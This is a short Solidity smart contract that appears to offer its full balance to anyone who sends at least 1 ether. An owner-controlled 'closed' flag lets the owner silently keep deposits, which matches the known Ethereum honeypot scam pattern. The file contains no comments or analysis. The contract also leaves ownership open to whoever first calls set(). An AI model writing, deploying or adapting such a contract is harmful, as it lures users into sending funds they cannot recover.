pragma solidity ^0.4.25;

contract MacLennonIC {
    function() public payable {}
    address Owner; bool closed = false;
    function set() public payable {
        if (0==Owner) Owner=msg.sender;
    }
    function close(bool F) public {
        if (msg.sender==Owner) closed=F;
    }
    function get() public payable {
        if (msg.value>=1 ether && !closed) {
            msg.sender.transfer(address(this).balance);
        }
    }
}